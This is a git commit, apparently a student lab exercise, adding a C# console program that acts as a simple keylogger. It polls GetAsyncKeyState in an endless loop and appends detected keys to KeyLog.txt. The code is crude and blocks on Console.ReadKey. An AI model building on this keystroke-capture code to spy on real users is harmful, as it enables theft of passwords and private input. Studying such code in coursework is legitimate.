facd3ba91782f9f8cb2dcb114914ad038edce152
Artem Bokun <79195348+relsa228@users.noreply.github.com>
2021-04-02 21:05:12 +0300

    new lab

---
+++ LR-4/LR-4-1/Program.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace LR_4_1
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            [DllImport("user32.dll")]
+            static extern int GetAsyncKeyState(Int32 i);
+
+            while (true)
+            {
+                StreamWriter f = new StreamWriter("KeyLog.txt", true);
+                char key = ' ';
+                for (int i = 8; i < 190; i++)
+                {
+                    if (GetAsyncKeyState(i) != 0)
+                    {
+                        key = (char) i;
+                    }
+                }
+                f.Write(key);
+                Console.ReadKey();
+                f.Close();
+            }
+        }
+    }
+}
